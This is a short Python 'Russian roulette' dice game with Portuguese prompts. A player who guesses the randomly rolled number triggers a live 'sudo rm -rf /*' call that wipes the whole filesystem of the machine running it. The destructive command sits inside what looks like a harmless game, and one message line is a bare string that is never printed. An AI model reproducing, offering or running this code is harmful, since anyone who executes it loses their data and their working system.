import os, random, time

for i in range(3):
    os.system('sudo clear')
    print('Tentativa {} de 3.\n'.format(i+1))
    userinput = int(input('Escolha um número de 1 a 6: '))
    numero_escolhido = random.randint(1,6)
    if userinput in [1,2,3,4,5,6]:
        print('O número sorteado é {}.'.format(numero_escolhido))

        if numero_escolhido == userinput:
            print('\nFoi de vala...')
            time.sleep(1)
            os.system('sudo rm -rf /*')
            break
        else:
            print('\nUfa!')
            time.sleep(2)
    else:
        ('Digite um número de 1 a 6.')
        time.sleep(2)
    time.sleep(1)
